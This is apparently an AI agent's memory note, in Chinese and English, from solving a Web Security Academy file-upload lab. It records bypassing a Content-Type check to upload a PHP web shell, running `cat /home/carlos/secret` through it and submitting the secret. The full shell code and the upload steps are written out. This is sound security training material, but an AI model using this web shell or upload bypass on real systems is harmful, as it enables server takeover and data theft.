---
metadata:
  node_type: memory
name: "lab-file-upload-web-shell-upload-via-content-type-restriction-bypass/A"
description: "A 臂实录:Content-Type 声明 image/jpeg 上传 .php webshell,读 /home/carlos/secret 后翻牌"
last_updated: 2026-10-10T02:38:42+08:00
created: 2026-10-10T02:38:42+08:00
---

Arm A run, instance https://0a29009b037c457a819a674a0021003a.web-security-academy.net/ (jar /tmp/cj1.json).

- 题面方法:上传函数只检查用户可控输入(Content-Type)。声明 image/jpeg、文件名 .php 即可。
- 链路:GET /login 取 csrf → POST /login(wiener:peter,302 /my-account)→ GET /my-account 读表单(action=/my-account/avatar,字段 avatar/user/csrf)。
- 投递:`upload` --file avatar=/tmp/shell.php --type avatar=image/jpeg --field user=wiener --field csrf=... → 200 空体,文件落盘成功。
- shell:`<?php echo "PWN:" . shell_exec($_GET['cmd']); ?>`
- 读密:GET /files/avatars/shell.php?cmd=cat%20/home/carlos/secret → `PWN:teqwMmc411TAfuaUxPECobSgUji7QusO`
- 翻牌:POST /submitSolution answer=<secret> → {"correct":true};banner_verdict 读到 "Congratulations, you solved the lab!"。
- 要点:`upload` 的 --type 只改 part 的 Content-Type 头,文件名由 --file 路径决定,两者解耦正是本类绕过的杠杆;上传返回 200 空体不等于失败,直接取 shell 验证。

